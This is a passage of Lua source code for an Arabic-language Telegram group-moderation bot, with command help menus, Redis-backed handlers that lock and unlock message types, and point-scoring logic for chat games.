bot.sendText(msg.chat_id,msg.id,"*⌁︙اوامر المنشئين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تنزيل الكل\n⌁︙الميديا • امسح\n⌁︙تعين عدد الحذف\n⌁︙ترتيب الاوامر\n⌁︙اضف • حذف ↫ امر\n⌁︙حذف الاوامر المضافه\n⌁︙الاوامر المضافه\n⌁︙اضف نقاط ↫ بالرد • بالايدي\n⌁︙اضف رسائل ↫ بالرد • بالايدي\n⌁︙رفع منظف • تنزيل منظف\n⌁︙المنظفين • حذف المنظفين\n⌁︙رفع مدير • تنزيل مدير\n⌁︙المدراء • حذف المدراء\n⌁︙تفعيل • تعطيل + الامر ↫ ⤈\n⌁︙نزلني • امسح\n⌁︙الحظر • الكتم\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اوامر المنشئين الاساسيين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙وضع لقب + اللقب\n⌁︙تفعيل • تعطيل ↫ الرفع\n⌁︙رفع منشئ • تنزيل منشئ\n⌁︙المنشئين • حذف المنشئين\n⌁︙رفع • تنزيل ↫ مشرف\n⌁︙رفع بكل الصلاحيات\n⌁︙حذف القوائم\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اوامر المالكين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙رفع • تنزيل ↫ منشئ اساسي\n⌁︙حذف المنشئين الاساسيين \n⌁︙المنشئين الاساسيين \n⌁︙حذف جميع الرتب\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉*","md",true)
elseif text == "م5" or text == "م٥" then    
bot.sendText(msg.chat_id,msg.id,"*⌁︙اوامر المطورين ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الكروبات\n⌁︙المطورين\n⌁︙المشتركين\n⌁︙الاحصائيات\n⌁︙المجموعات\n⌁︙اسم البوت + غادر\n⌁︙اسم البوت + تعطيل\n⌁︙كشف + -ايدي المجموعه\n⌁︙رفع مالك • تنزيل مالك\n⌁︙المالكين • حذف المالكين\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙رفع • تنزيل ↫ مدير عام\n⌁︙حذف • المدراء العامين \n⌁︙رفع • تنزيل ↫ ادمن عام\n⌁︙حذف • الادمنيه العامين \n⌁︙رفع • تنزيل ↫ مميز عام\n⌁︙حذف • المميزين عام \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اوامر المطور الاساسي ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تحديث\n⌁︙الملفات\n⌁︙المتجر\n⌁︙السيرفر\n⌁︙روابط الكروبات\n⌁︙تحديث السورس\n⌁︙تنظيف الكروبات\n⌁︙تنظيف المشتركين\n⌁︙حذف جميع الملفات\n⌁︙تعيين الايدي العام\n⌁︙تغير المطور الاساسي\n⌁︙حذف معلومات الترحيب\n⌁︙تغير معلومات الترحيب\n⌁︙غادر + -ايدي المجموعه\n⌁︙تعيين عدد الاعضاء + العدد\n⌁︙حظر عام • الغاء العام\n⌁︙كتم عام • الغاء العام\n⌁︙قائمه العام • حذف قائمه العام\n⌁︙وضع • حذف ↫ اسم البوت\n⌁︙اضف • حذف ↫ رد عام\n⌁︙ردود المطور • حذف ردود المطور\n⌁︙تعيين • حذف • جلب ↫ رد الخاص\n⌁︙جلب نسخه الكروبات\n⌁︙رفع النسخه + بالرد على الملف\n⌁︙تعيين • حذف ↫ قناة الاشتراك\n⌁︙جلب كليشه الاشتراك\n⌁︙تغيير • حذف ↫ كليشه الاشتراك\n⌁︙رفع • تنزيل ↫ مطور\n⌁︙المطورين • حذف المطورين\n⌁︙رفع • تنزيل ↫ مطور ثانوي\n⌁︙الثانويين • حذف الثانويين\n⌁︙تعيين • حذف ↫ كليشة الايدي\n⌁︙اذاعه للكل بالتوجيه ↫ بالرد\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تفعيل ملف + اسم الملف\n⌁︙تعطيل ملف + اسم الملف\n⌁︙تفعيل • تعطيل + الامر ↫ ⤈\n⌁︙الاذاعه • الاشتراك الاجباري\n⌁︙ترحيب البوت • المغادره\n⌁︙البوت الخدمي • التواصل*","md",true)
elseif text == "م6" or text == "م٦" then    
bot.sendText(msg.chat_id,msg.id,"*• اوامر التسليه \n *━━━━━━━━━━━ *\n• الالعاب \n• الالعاب المتطوره\n• برج اسم برجك \n• زخرفه النص\n• احسب عمرك\n• بحث + اسم الاغنية\n• ثنائي\n• فلم\n• غنيلي•\n• تحدي\n• زوجيني\n• افتاري\n• استوري\n• ميمز \n• قولي + الكلام\n• قيف\n• افتار\n• افتارات عيال\n• افتارات بنات\n• تتزوجيني\n• انا مين\n• قولي - الكلام \n• كت تويت\n• ٴId\n• همسه\n• صراحه\n• لو خيروك\n• نادي المطور\n• يوزري\n• اسمي\n• البايو\n• شخصيتي\n• لقبي\n• ايديي\n• مسح نقاطي \n• نقاطي\n• مسح رسائلي \n• رسائلي\n• مسح جهاتي \n• تفاعلي\n• جهاتي\n• مسح تعديلاتي \n• تعديلاتي  \n• معلوماتي \n• التاريخ/الساعه \n• رابط الحذف\n• جمالي\n• نسبه الحب - الكره\n• نسبه الذكاء - الغباء \n• نسبه الرجوله - الانوثه *","md",true)

elseif text == "قفل الكل" then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم قفل جميع الاوامر *").by,"md",true)
list ={"Spam","Edited","Hashtak","via_bot_user_id","messageChatAddMembers","forward_info","Links","Markdaun","WordsFshar","Spam","Tagservr","Username","Keyboard","messagePinMessage","messageSenderChat","Cmd","messageLocation","messageContact","messageVideoNote","messagePoll","messageAudio","messageDocument","messageAnimation","messageSticker","messageUnsupported","messageVoiceNote","WordsPersian","messagePhoto","messageVideo"}
for i,lock in pairs(list) do
redis:set(bot_id..":"..msg.chat_id..":settings:"..lock,"del")    
end
redis:hset(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User","del")  
elseif text == "فتح الكل" and BasicConstructor(msg) then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم فتح جميع الاوامر*").by,"md",true)
list ={"Edited","Hashtak","via_bot_user_id","messageChatAddMembers","forward_info","Links","Markdaun","WordsFshar","Spam","Tagservr","Username","Keyboard","messagePinMessage","messageSenderChat","Cmd","messageLocation","messageContact","messageVideoNote","messageText","message","messagePoll","messageAudio","messageDocument","messageAnimation","AddMempar","messageSticker","messageUnsupported","messageVoiceNote","WordsPersian","WordsEnglish","JoinByLink","messagePhoto","messageVideo"}
for i,unlock in pairs(list) do 
redis:del(bot_id..":"..msg.chat_id..":settings:"..unlock)    
end
redis:hdel(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User")
elseif text == "قفل التكرار" then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم قفل  التكرار*").by,"md",true)
redis:hset(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User","del")  
elseif text == "فتح التكرار" then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم فتح التكرار*").by,"md",true)
redis:hdel(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User")  
elseif text == "قفل التكرار بالطرد" then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  التكرار بالطرد*").by,"md",true)
redis:hset(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User","kick")  
elseif text == "قفل التكرار بالتقييد" then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل  التكرار بالتقيد*").by,"md",true)
redis:hset(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User","ked")  
elseif text == "قفل التكرار بالكتم" then 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم تفعيل التكرار بالكتم*").by,"md",true)  
redis:hset(bot_id.."Spam:Group:User"..msg.chat_id ,"Spam:User","ktm")  
return false
end  
if text and text:match("^قفل (.*)$") and tonumber(msg.reply_to_message_id) == 0 then
TextMsg = text:match("^قفل (.*)$")
if text:match("^(.*)بالكتم$") then
setTyp = "ktm"
elseif text:match("^(.*)بالتقيد$") or text:match("^(.*)بالتقييد$") then  
setTyp = "ked"
elseif text:match("^(.*)بالطرد$") then 
setTyp = "kick"
else
setTyp = "del"
end
if msg.content.text then 
if TextMsg == 'الصور' or TextMsg == 'الصور بالكتم' or TextMsg == 'الصور بالطرد' or TextMsg == 'الصور بالتقييد' or TextMsg == 'الصور بالتقيد' then
srt = "messagePhoto"
elseif TextMsg == 'الفيديو' or TextMsg == 'الفيديو بالكتم' or TextMsg == 'الفيديو بالطرد' or TextMsg == 'الفيديو بالتقييد' or TextMsg == 'الفيديو بالتقيد' then
srt = "messageVideo"
elseif TextMsg == 'الفارسيه' or TextMsg == 'الفارسيه بالكتم' or TextMsg == 'الفارسيه بالطرد' or TextMsg == 'الفارسيه بالتقييد' or TextMsg == 'الفارسيه بالتقيد' then
srt = "WordsPersian"
elseif TextMsg == 'الانكليزيه' or TextMsg == 'الانكليزيه بالكتم' or TextMsg == 'الانكليزيه بالطرد' or TextMsg == 'الانكليزيه بالتقييد' or TextMsg == 'الانكليزيه بالتقيد' then
srt = "WordsEnglish"
elseif TextMsg == 'الدخول' or TextMsg == 'الدخول بالكتم' or TextMsg == 'الدخول بالطرد' or TextMsg == 'الدخول بالتقييد' or TextMsg == 'الدخول بالتقيد' then
srt = "JoinByLink"
elseif TextMsg == 'الاضافه' or TextMsg == 'الاضافه بالكتم' or TextMsg == 'الاضافه بالطرد' or TextMsg == 'الاضافه بالتقييد' or TextMsg == 'الاضافه بالتقيد' then
srt = "AddMempar"
elseif TextMsg == 'الملصقات' or TextMsg == 'الملصقات بالكتم' or TextMsg == 'الملصقات بالطرد' or TextMsg == 'الملصقات بالتقييد' or TextMsg == 'الملصقات بالتقيد' then
srt = "messageSticker"
elseif TextMsg == 'الملصقات المتحركه' or TextMsg == 'الملصقات المتحركه بالكتم' or TextMsg == 'الملصقات المتحركه بالطرد' or TextMsg == 'الملصقات المتحركه بالتقييد' or TextMsg == 'الملصقات المتحركه بالتقيد' then
srt = "messageUnsupported"
elseif TextMsg == 'الاغاني' or TextMsg == 'الاغاني بالكتم' or TextMsg == 'الاغاني بالطرد' or TextMsg == 'الاغاني بالتقييد' or TextMsg == 'الاغاني بالتقيد' then
srt = "messageVoiceNote"
elseif TextMsg == 'الصوت' or TextMsg == 'الصوت بالكتم' or TextMsg == 'الصوت بالطرد' or TextMsg == 'الصوت بالتقييد' or TextMsg == 'الصوت بالتقيد' then
srt = "messageAudio"
elseif TextMsg == 'الملفات' or TextMsg == 'الملفات بالكتم' or TextMsg == 'الملفات بالطرد' or TextMsg == 'الملفات بالتقييد' or TextMsg == 'الملفات بالتقيد' then
srt = "messageDocument"
elseif TextMsg == 'المتحركه' or TextMsg == 'المتحركه بالكتم' or TextMsg == 'المتحركه بالطرد' or TextMsg == 'المتحركه بالتقييد' or TextMsg == 'المتحركه بالتقيد' then
srt = "messageAnimation"
elseif TextMsg == 'الرسائل' or TextMsg == 'الرسائل بالكتم' or TextMsg == 'الرسائل بالطرد' or TextMsg == 'الرسائل بالتقييد' or TextMsg == 'الرسائل بالتقيد' then
srt = "messageText"
elseif TextMsg == 'الدردشه' or TextMsg == 'الدردشه بالكتم' or TextMsg == 'الدردشه بالطرد' or TextMsg == 'الدردشه بالتقييد' or TextMsg == 'الدردشه بالتقيد' then
srt = "message"
elseif TextMsg == 'الاستفتاء' or TextMsg == 'الاستفتاء بالكتم' or TextMsg == 'الاستفتاء بالطرد' or TextMsg == 'الاستفتاء بالتقييد' or TextMsg == 'الاستفتاء بالتقيد' then
srt = "messagePoll"
elseif TextMsg == 'الموقع' or TextMsg == 'الموقع بالكتم' or TextMsg == 'الموقع بالطرد' or TextMsg == 'الموقع بالتقييد' or TextMsg == 'الموقع بالتقيد' then
srt = "messageLocation"
elseif TextMsg == 'الجهات' or TextMsg == 'الجهات بالكتم' or TextMsg == 'الجهات بالطرد' or TextMsg == 'الجهات بالتقييد' or TextMsg == 'الجهات بالتقيد' then
srt = "messageContact"
elseif TextMsg == 'السيلفي' or TextMsg == 'السيلفي بالكتم' or TextMsg == 'السيلفي بالطرد' or TextMsg == 'السيلفي بالتقييد' or TextMsg == 'السيلفي بالتقيد' or TextMsg == 'الفيديو نوت' or TextMsg == 'الفيديو نوت بالكتم' or TextMsg == 'الفيديو نوت بالطرد' or TextMsg == 'الفيديو نوت بالتقييد' or TextMsg == 'الفيديو نوت بالتقيد' then
srt = "messageVideoNote"
elseif TextMsg == 'التثبيت' or TextMsg == 'التثبيت بالكتم' or TextMsg == 'التثبيت بالطرد' or TextMsg == 'التثبيت بالتقييد' or TextMsg == 'التثبيت بالتقيد' then
srt = "messagePinMessage"
elseif TextMsg == 'القناه' or TextMsg == 'القناه بالكتم' or TextMsg == 'القناه بالطرد' or TextMsg == 'القناه بالتقييد' or TextMsg == 'القناه بالتقيد' then
srt = "messageSenderChat"
elseif TextMsg == 'الشارحه' or TextMsg == 'الشارحه بالكتم' or TextMsg == 'الشارحه بالطرد' or TextMsg == 'الشارحه بالتقييد' or TextMsg == 'الشارحه بالتقيد' then
srt = "Cmd"
elseif TextMsg == 'الاشعارات' or TextMsg == 'الاشعارات بالكتم' or TextMsg == 'الاشعارات بالطرد' or TextMsg == 'الاشعارات بالتقييد' or TextMsg == 'الاشعارات بالتقيد' then
srt = "Tagservr"
elseif TextMsg == 'المعرفات' or TextMsg == 'المعرفات بالكتم' or TextMsg == 'المعرفات بالطرد' or TextMsg == 'المعرفات بالتقييد' or TextMsg == 'المعرفات بالتقيد' then
srt = "Username"
elseif TextMsg == 'الكيبورد' or TextMsg == 'الكيبورد بالكتم' or TextMsg == 'الكيبورد بالطرد' or TextMsg == 'الكيبورد بالتقييد' or TextMsg == 'الكيبورد بالتقيد' then
srt = "Keyboard"
elseif TextMsg == 'الماركداون' or TextMsg == 'الماركداون بالكتم' or TextMsg == 'الماركداون بالطرد' or TextMsg == 'الماركداون بالتقييد' or TextMsg == 'الماركداون بالتقيد' then
srt = "Markdaun"
elseif TextMsg == 'الفشار' or TextMsg == 'الفشار بالكتم' or TextMsg == 'الفشار بالطرد' or TextMsg == 'الفشار بالتقييد' or TextMsg == 'الفشار بالتقيد' then
srt = "WordsFshar"
elseif TextMsg == 'الكلايش' or TextMsg == 'الكلايش بالكتم' or TextMsg == 'الكلايش بالطرد' or TextMsg == 'الكلايش بالتقييد' or TextMsg == 'الكلايش بالتقيد' then
srt = "Spam"
elseif TextMsg == 'البوتات' or TextMsg == 'البوتات بالكتم' or TextMsg == 'البوتات بالطرد' or TextMsg == 'البوتات بالتقييد' or TextMsg == 'البوتات بالتقيد' then
srt = "messageChatAddMembers"
elseif TextMsg == 'التوجيه' or TextMsg == 'التوجيه بالكتم' or TextMsg == 'التوجيه بالطرد' or TextMsg == 'التوجيه بالتقييد' or TextMsg == 'التوجيه بالتقيد' then
srt = "forward_info"
elseif TextMsg == 'الروابط' or TextMsg == 'الروابط بالكتم' or TextMsg == 'الروابط بالطرد' or TextMsg == 'الروابط بالتقييد' or TextMsg == 'الروابط بالتقيد' then
srt = "Links"
elseif TextMsg == 'التعديل' or TextMsg == 'التعديل بالكتم' or TextMsg == 'التعديل بالطرد' or TextMsg == 'التعديل بالتقييد' or TextMsg == 'التعديل بالتقيد' or TextMsg == 'تعديل الميديا' or TextMsg == 'تعديل الميديا بالكتم' or TextMsg == 'تعديل الميديا بالطرد' or TextMsg == 'تعديل الميديا بالتقييد' or TextMsg == 'تعديل الميديا بالتقيد' then
srt = "Edited"
elseif TextMsg == 'تاك' or TextMsg == 'تاك بالكتم' or TextMsg == 'تاك بالطرد' or TextMsg == 'تاك بالتقييد' or TextMsg == 'تاك بالتقيد' then
srt = "Hashtak"
elseif TextMsg == 'الانلاين' or TextMsg == 'الانلاين بالكتم' or TextMsg == 'الانلاين بالطرد' or TextMsg == 'الانلاين بالتقييد' or TextMsg == 'الانلاين بالتقيد' then
srt = "via_bot_user_id"
else
return false
end  
if redis:get(bot_id..":"..msg.chat_id..":settings:"..srt) == setTyp then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙"..TextMsg.." مقفل من قبل*").by,"md",true)  
else
redis:set(bot_id..":"..msg.chat_id..":settings:"..srt,setTyp)
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*تم قفل  "..TextMsg.." *").by,"md",true)  
end
end
end
if text and text:match("^فتح (.*)$") and tonumber(msg.reply_to_message_id) == 0 then
local TextMsg = text:match("^فتح (.*)$")
local TextMsg = text:match("^فتح (.*)$")
if msg.content.text then 
if TextMsg == 'الصور' then
srt = "messagePhoto"
elseif TextMsg == 'الفيديو' then
srt = "messageVideo "
elseif TextMsg == 'الفارسيه' or TextMsg == 'الفارسية' or TextMsg == 'الفارسي' then
srt = "WordsPersian"
elseif TextMsg == 'الانكليزيه' or TextMsg == 'الانكليزية' or TextMsg == 'الانكليزي' then
srt = "WordsEnglish"
elseif TextMsg == 'الدخول' then
srt = "JoinByLink"
elseif TextMsg == 'الاضافه' then
srt = "AddMempar"
elseif TextMsg == 'الملصقات' then
srt = "messageSticker"
elseif TextMsg == 'الملصقات المتحركه' then
srt = "messageUnsupported"
elseif TextMsg == 'الاغاني' then
srt = "messageVoiceNote"
elseif TextMsg == 'الصوت' then
srt = "messageAudio"
elseif TextMsg == 'الملفات' then
srt = "messageDocument "
elseif TextMsg == 'المتحركه' then
srt = "messageAnimation"
elseif TextMsg == 'الرسائل' then
srt = "messageText"
elseif TextMsg == 'التثبيت' then
srt = "messagePinMessage"
elseif TextMsg == 'الدردشه' then
srt = "message"
elseif TextMsg == 'التوجيه' and BasicConstructor(msg) then
srt = "forward_info"
elseif TextMsg == 'الاستفتاء' then
srt = "messagePoll"
elseif TextMsg == 'الموقع' then
srt = "messageLocation"
elseif TextMsg == 'الجهات' and BasicConstructor(msg) then
srt = "messageContact"
elseif TextMsg == 'السيلفي' or TextMsg == 'الفيديو نوت' then
srt = "messageVideoNote"
elseif TextMsg == 'القناه' and BasicConstructor(msg) then
srt = "messageSenderChat"
elseif TextMsg == 'الشارحه' then
srt = "Cmd"
elseif TextMsg == 'الاشعارات' then
srt = "Tagservr"
elseif TextMsg == 'المعرفات' then
srt = "Username"
elseif TextMsg == 'الكيبورد' then
srt = "Keyboard"
elseif TextMsg == 'الكلايش' then
srt = "Spam"
elseif TextMsg == 'الماركداون' then
srt = "Markdaun"
elseif TextMsg == 'الفشار' then
srt = "WordsFshar"
elseif TextMsg == 'البوتات' and BasicConstructor(msg) then
srt = "messageChatAddMembers"
elseif TextMsg == 'الرابط' or TextMsg == 'الروابط' then
srt = "Links"
elseif TextMsg == 'التعديل' and BasicConstructor(msg) then
srt = "Edited"
elseif TextMsg == 'تاك' or TextMsg == 'هشتاك' then
srt = "Hashtak"
elseif TextMsg == 'الانلاين' or TextMsg == 'الهمسه' or TextMsg == 'انلاين' then
srt = "via_bot_user_id"
else
return false
end  
if not redis:get(bot_id..":"..msg.chat_id..":settings:"..srt) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙"..TextMsg.." مفتوحة من قبل*").by,"md",true)  
else
redis:del(bot_id..":"..msg.chat_id..":settings:"..srt)
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*↯︙تم فتحت "..TextMsg.." *").by,"md",true)  
end
end
end
end
----------------------------------------------------------------------------------------------------
if text == "اطردني" or text == "طردني" then
if redis:get(bot_id..":"..msg.chat_id..":settings:kickme") then
return bot.sendText(msg.chat_id,msg.id,"*• تم تعطيل اطردني من قبل المدراء .*","md",true)  
end
bot.sendText(msg.chat_id,msg.id,"*• اضغط نعم لتأكيد طردك *","md", true, false, false, false, bot.replyMarkup{
type = 'inline',data = {{{text = '- نعم .',data="Sur_"..msg.sender.user_id.."_1"},{text = '- الغاء .',data="Sur_"..msg.sender.user_id.."_2"}},}})
end
if text == 'الالعاب' or text == 'قائمه الالعاب' or text == 'قائمة الالعاب' or text == 'العاب' then
t = "• قائمة العاب البوت\n━━━━━━━━━━━\n• لعبة البنك ~⪼ بنك\n• لعبة حجرة ورقة مقص ~⪼ حجره\n• لعبة الرياضه ~⪼ رياضه\n• لعبة معرفة الصورة ~⪼ صور\n• لعبة معرفة الموسيقى ~⪼ موسيقى\n• لعبة المشاهير ~⪼ مشاهير\n• لعبة المختلف ~⪼ المختلف\n• لعبة الامثله ~⪼ امثله\n• لعبة العكس ~⪼ العكس\n• لعبة الحزوره ~⪼ حزوره\n• لعبة المعاني ~⪼ معاني\n• لعبة البات ~⪼ بات\n• لعبة التخمين ~⪼ خمن\n• لعبه الاسرع ~⪼ الاسرع\n• لعبه الترجمه ~⪼ انكليزي\n• لعبه الاسئله ~⪼ اسئله\n• لعبه تفكيك الكلمه ~⪼ تفكيك\n• لعبه تركيب الكلمه ~⪼ تركيب\n• لعبه الرياضيات ~⪼ رياضيات\n• لعبة السمايلات ~⪼ سمايلات\n• لعبة العواصم ~⪼ العواصم\n• لعبة الارقام ~⪼ ارقام\n• لعبة الحروف ~⪼ حروف\n• لعبة الاسئلة ~⪼ كت تويت\n• لعبة الاعلام والدول ~⪼ اعلام\n• لعبة الصراحه ~⪼ صراحه\n• لعبة الروليت ~⪼ روليت\n• لعبة احكام ~⪼ احكام\n• لعبة العقاب ~⪼ عقاب\n• لعبة الكلمات ~⪼ كلمات\n━━━━━━━━━━━\n• نقاطي ~⪼ لعرض عدد نقاطك\n• بيع نقاطي + العدد ~ لبيع كل نقطه مقابل 50 رساله"
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).helo,"md", true)
end
if not Bot(msg) then
if text == 'المشاركين' and redis:get(bot_id..":Witting_StartGame:"..msg.chat_id..msg.sender.user_id) then
local list = redis:smembers(bot_id..':List_Rolet:'..msg.chat_id) 
local Text = '\n  *ٴ─━─━─━─×─━─━─━─ *\n'
if #list == 0 then 
bot.sendText(msg.chat_id,msg.id,"*• لا يوجد لاعبين*","md",true)
return false
end  
for k, v in pairs(list) do 
Text = Text..k.."-  [" ..v.."] .\n"  
end 
return bot.sendText(msg.chat_id,msg.id,Text,"md",true)  
end
if text == 'نعم' and redis:get(bot_id..":Witting_StartGame:"..msg.chat_id..msg.sender.user_id) then
local list = redis:smembers(bot_id..':List_Rolet:'..msg.chat_id) 
if #list == 1 then 
bot.sendText(msg.chat_id,msg.id,"*↯︙لم يكتمل العدد الكلي للاعبين*","md",true)  
elseif #list == 0 then 
bot.sendText(msg.chat_id,msg.id,"*↯︙عذرا لم تقوم باضافه اي لاعب*","md",true)  
return false
end 
local UserName = list[math.random(#list)]
local User_ = UserName:match("^@(.*)$")
local UserId_Info = bot.searchPublicChat(User_)
if (UserId_Info.id) then
redis:incrby(bot_id..":"..msg.chat_id..":"..UserId_Info.id..":game", 3)  
redis:del(bot_id..':List_Rolet:'..msg.chat_id) 
redis:del(bot_id..":Witting_StartGame:"..msg.chat_id..msg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,"*• مبروك * ["..UserName.."] *لقد فزت\n• تم اضافه 3 نقاط لك\n","md",true)  
return false
end
end
if text and text:match('^(@[%a%d_]+)$') and redis:get(bot_id..":Number_Add:"..msg.chat_id..msg.sender.user_id) then
if redis:sismember(bot_id..':List_Rolet:'..msg.chat_id,text) then
bot.sendText(msg.chat_id,msg.id,"*• المعرف* ["..text.." ] *موجود سابقا ارسل معرف لم يشارك*","md",true)  
return false
end 
redis:sadd(bot_id..':List_Rolet:'..msg.chat_id,text)
local CountAdd = redis:get(bot_id..":Number_Add:"..msg.chat_id..msg.sender.user_id)
local CountAll = redis:scard(bot_id..':List_Rolet:'..msg.chat_id)
local CountUser = CountAdd - CountAll
if tonumber(CountAll) == tonumber(CountAdd) then 
redis:del(bot_id..":Number_Add:"..msg.chat_id..msg.sender.user_id) 
redis:setex(bot_id..":Witting_StartGame:"..msg.chat_id..msg.sender.user_id,1400,true)  
bot.sendText(msg.chat_id,msg.id,"*• تم حفظ المعرف (*["..text.."]*)\n• ارسل ( نعم ) للبدء*","md",true)  
return false
end  
bot.sendText(msg.chat_id,msg.id,"*• تم حفظ المعرف* (["..text.."])\n*• تبقى "..CountUser.." لاعبين ليكتمل العدد\n• ارسل المعرف التالي*","md",true)  
return false
end 
if text and text:match("^(%d+)$") and redis:get(bot_id..":Start_Rolet:"..msg.chat_id..msg.sender.user_id) then
if text == "1" then
bot.sendText(msg.chat_id,msg.id," *• لا استطيع بدء اللعبه بلاعب واحد فقط*","md",true)
elseif text ~= "1" then
redis:set(bot_id..":Number_Add:"..msg.chat_id..msg.sender.user_id,text)  
redis:del(bot_id..":Start_Rolet:"..msg.chat_id..msg.sender.user_id)  
bot.sendText(msg.chat_id,msg.id,"*• ارسل معرفات اللاعبين الان*","md",true)
return false
end
end
if redis:get(bot_id.."Game:Smile"..msg.chat_id) then
if text == redis:get(bot_id.."Game:Smile"..msg.chat_id) then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
redis:del(bot_id.."Game:Smile"..msg.chat_id)
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end 

if redis:get(bot_id.."GAME:S"..msg.chat_id) then
if text == redis:get(bot_id.."GAME:CHER"..msg.chat_id) then
redis:del(bot_id.."GAME:S"..msg.chat_id)
redis:del(bot_id.."GAME:CHER"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end 

if redis:get(bot_id.."Game:Monotonous"..msg.chat_id) then
if text == redis:get(bot_id.."Game:Monotonous"..msg.chat_id) then
redis:del(bot_id.."Game:Monotonous"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.."\n ","md",true)
end
end 
if redis:get(bot_id.."Game:Riddles"..msg.chat_id) then
if text == redis:get(bot_id.."Game:Riddles"..msg.chat_id) then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
redis:del(bot_id.."Game:Riddles"..msg.chat_id)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end
if redis:get(bot_id.."Game:Meaningof"..msg.chat_id) then
if text == redis:get(bot_id.."Game:Meaningof"..msg.chat_id) then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
redis:del(bot_id.."Game:Meaningof"..msg.chat_id)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.." \n","md",true)
end
end
if redis:get(bot_id.."Game:Reflection"..msg.chat_id) then
if text == redis:get(bot_id.."Game:Reflection"..msg.chat_id) then
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
redis:del(bot_id.."Game:Reflection"..msg.chat_id)
ballancee = redis:get(bot_id.."boob"..msg.sender.user_id) or 0
gampoin = ballancee + 1
redis:set(bot_id.."boob"..msg.sender.user_id , gampoin)
local Num = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game") or 0
return bot.sendText(msg.chat_id,msg.id,"\n• كفو اجابتك صح \n• تم اضافة لك نقطة\n• نقاطك الان : "..Num.."\n ","md",true)
end
end

if redis:get(bot_id.."Game:Example"..msg.chat_id) then
if text == redis:get(bot_id.."Game:Example"..msg.chat_id) then 
redis:del(bot_id.."Game:Example"..msg.chat_id)
redis:incrby(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":game", 1)  
